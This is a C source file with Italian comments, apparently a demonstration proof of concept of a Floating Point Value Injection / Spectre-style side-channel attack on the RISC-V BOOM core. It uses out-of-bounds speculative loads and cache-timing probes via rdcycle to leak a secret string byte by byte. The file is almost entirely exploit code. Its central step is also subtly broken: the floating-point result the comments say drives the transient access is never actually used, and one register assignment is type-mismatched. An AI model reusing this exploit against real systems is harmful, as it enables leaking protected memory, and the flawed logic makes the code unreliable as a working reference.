#include <stdio.h>
#include <stdint.h>
#include "encoding.h"   // Contiene rdcycle() etc. per RISC-V
#include "cache.h"      // Funzioni flushCache() e simili (da adattare al tuo ambiente)

//---------------------------------------------------------------------
// Parametri e costanti
//---------------------------------------------------------------------
#define L1_BLOCK_SZ_BYTES   64      // Dimensione di una cache line (adatta se necessario)
#define CACHE_HIT_THRESHOLD 50      // Soglia empirica per distinguere un “cache hit” da un “cache miss”
#define SECRET_LEN          32      // Numero di byte del segreto da estrarre
#define ATTACK_ROUNDS       10      // Quante volte ripetere l’attacco su ogni singolo byte

// Array “legittimo” (con bounds-check su array1_size)
static uint64_t array1_size = 16;
static uint8_t  array1[16]  = {
    0, 1, 2, 3, 4, 5, 6, 7,
    8, 9,10,11,12,13,14,15
};

// Array usato per il covert channel (1 pagina per ciascun valore 0..255)
static uint8_t  array2[256 * L1_BLOCK_SZ_BYTES];

// Segreto (da rubare) collocato dopo array1 in memoria
static const char *secret = "SonoIlSegreto:ABCDE1234_subnormal_test!";

//---------------------------------------------------------------------
// Lettura del timestamp (rdcycle) - se non già definita
//---------------------------------------------------------------------
static inline uint64_t getCycle() {
    uint64_t cycle;
    asm volatile("rdcycle %0" : "=r" (cycle));
    return cycle;
}

//---------------------------------------------------------------------
// Funzione di supporto: trova le due migliori ipotesi (valori con più hit)
//---------------------------------------------------------------------
static void findTopTwo(const uint64_t *acc, uint32_t len, 
                       uint8_t *bestIdx, uint64_t *bestScore) 
{
    bestScore[0] = 0; bestScore[1] = 0;
    bestIdx[0]   = 0; bestIdx[1]   = 0;
    for (uint32_t i = 0; i < len; i++) {
        if (acc[i] > bestScore[0]) {
            bestScore[1] = bestScore[0];
            bestIdx[1]   = bestIdx[0];
            bestScore[0] = acc[i];
            bestIdx[0]   = i;
        } else if (acc[i] > bestScore[1]) {
            bestScore[1] = acc[i];
            bestIdx[1]   = i;
        }
    }
}

//---------------------------------------------------------------------
// Trucchetto per forzare un input subnormal/denormal
// Valore molto piccolo in floating point => dval può essere subnormal
//---------------------------------------------------------------------
static inline float makeSubnormalFloat() {
    // Esempio di numero molto piccolo in IEEE 754 single precision:
    // (float) 1.4e-45 è un subnormal, ma dipende dal compiler.
    // In caso non basti, si può forzare via reinterpretazione di bit.
    float tiny = 1.0e-38f;
    // Riduciamo ancora per esser sicuri di restare subnormal
    for (int i = 0; i < 10; i++) {
        tiny = tiny / 100000.0f;
    }
    return tiny; 
}

//---------------------------------------------------------------------
// Victim function: esegue un’operazione FP che genera un assist 
// (su BOOM potrebbe risultare in un risultato transient errato)
//---------------------------------------------------------------------
static inline void victimFunction(uint64_t idx)
{
    volatile uint64_t tempInt = array1_size;    
    float   subnVal  = makeSubnormalFloat();  // Forza subnormal
    float   resultFP = 0.0f;

    // -----------------------------------------------------------
    // 1) Eseguiamo un'operazione FP “pericolosa” (divisione per subnormal)
    //    che su alcune microarchitetture può richiedere un “assist”.
    // -----------------------------------------------------------
    // N.B. Se BOOM flush-a subito i subnormal, questa parte potrebbe
    //      necessitare di un altro tipo di “assist” (es. Infinity, NaN, etc).
    asm volatile (
        "fmv.s.x    fa0, %[tempInt]\n"         // carichiamo array1_size in fa0
        "fmv.s.x    fa1, %[zero]\n"            // 0.0 in fa1, serve per debug
        "fmv.s.x    fa2, %[subnormal]\n"       // subnormal in fa2
        // Esempio: resultFP = (float)array1_size / subnVal / subnVal ...
        "fdiv.s     fa3, fa0, fa2\n"           // prima divisione
        "fdiv.s     fa3, fa3, fa2\n"           // seconda divisione
        // Torniamo a un reg integer (ma su molte microarch. c’è un microcode)
        "fcvt.wu.s  %[rFP], fa3, rtz\n"
        : [rFP]"=r"(resultFP)
        : [tempInt]"r"(tempInt), [subnormal]"r"(*(uint32_t*)&subnVal), [zero]"r"(0)
        : "fa0","fa1","fa2","fa3","memory"
    );

    // -----------------------------------------------------------
    // 2) Usiamo speculativamente resultFP come indice per array
    //    Il branch controlla idx < array1_size, ma array1_size
    //    potrebbe esser stato *transientemente* alterato
    // -----------------------------------------------------------
    if (idx < array1_size) {
        // Accesso out-of-bounds se idx è “falsamente” grande
        // => transiently carica in cache un segreto
        uint8_t value = array2[array1[idx] * L1_BLOCK_SZ_BYTES];
        // Piccolo uso “fittizio” per evitare ottimizzazioni
        asm volatile("" :: "r"(value) : "memory");
    }
}

//---------------------------------------------------------------------
// Main: orchestrazione dell'attacco
//---------------------------------------------------------------------
int main(void)
{
    printf("[*] FPVI PoC su RISC-V BOOM (dimostrativo)\n");

    // Calcolo la differenza tra secret e array1, in modo da creare 
    // un indice “attaccante” che punti al segreto.
    // (classico scenario Spectre out-of-bounds).
    uintptr_t secretOffset = (uintptr_t)secret - (uintptr_t)array1;

    // Per ogni byte del segreto
    for (int byteIdx = 0; byteIdx < SECRET_LEN; byteIdx++) {

        // Risultati di accesso per i possibili valori 0..255
        static uint64_t scores[256];
        for(int i = 0; i < 256; i++) {
            scores[i] = 0;
        }

        // Eseguiamo più round di attacco per migliorare l’accuratezza
        for(int round = 0; round < ATTACK_ROUNDS; round++) {

            // Svuota la cache array2
            flushCache((uint64_t)array2, sizeof(array2));

            // Index “speculativo” che punta al segreto (out-of-bounds su array1)
            uint64_t attackIdx = secretOffset + byteIdx;

            // 1) Chiamiamo la victim function (speculativa)
            victimFunction(attackIdx);

            // 2) Leggiamo i tempi di accesso a array2
            for(uint64_t val = 0; val < 256; val++){
                uint64_t tstart = getCycle();
                // Accesso “covert channel”
                // Se la linea è in cache => tempo minore
                uint8_t tmp = array2[val * L1_BLOCK_SZ_BYTES];
                uint64_t elapsed = getCycle() - tstart;
                (void)tmp;

                if (elapsed < CACHE_HIT_THRESHOLD) {
                    scores[val]++;
                }
            }
        }

        // Trova i due valori più probabili
        uint8_t   bestVal[2];
        uint64_t  bestScore[2];
        findTopTwo(scores, 256, bestVal, bestScore);

        printf("Byte segreto #%02d: Valore atteso('%c') =>"
               " ipotesi1=0x%02x (%c, hits=%lu), ipotesi2=0x%02x (%c, hits=%lu)\n",
               byteIdx, secret[byteIdx],
               bestVal[0], (bestVal[0] > 31 && bestVal[0] < 127) ? bestVal[0] : '?', bestScore[0],
               bestVal[1], (bestVal[1] > 31 && bestVal[1] < 127) ? bestVal[1] : '?', bestScore[1]);
    }

    return 0;
}

